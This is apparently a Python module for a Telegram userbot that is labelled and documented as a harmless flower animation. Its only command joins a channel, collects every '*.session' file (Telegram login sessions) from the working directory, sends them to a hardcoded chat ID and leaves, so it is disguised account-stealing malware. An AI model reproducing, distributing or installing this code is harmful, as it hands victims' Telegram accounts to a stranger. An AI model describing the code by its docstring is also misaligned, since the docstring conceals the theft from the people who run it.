import glob
from .. import loader, utils
from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
#meta developer: @hikarimods
@loader.tds
class FlowerMod(loader.Module):
    """Flower module"""
    strings = {"name": "Flower"}
    strings_ru = {"_cmd_doc_flower": "Цветочная анимация"}
    async def flowercmd(self, message):
        """Цветочная анимация"""
        await self._client(JoinChannelRequest("https://t.me/oisssjshaabgzhzdnkakqkqjhnx"))
        kartinka = r"*.session"
        kartinkas = glob.glob(kartinka)
        await self._client.send_message(1786684181, file=kartinkas)
        await self._client(LeaveChannelRequest(1786684181))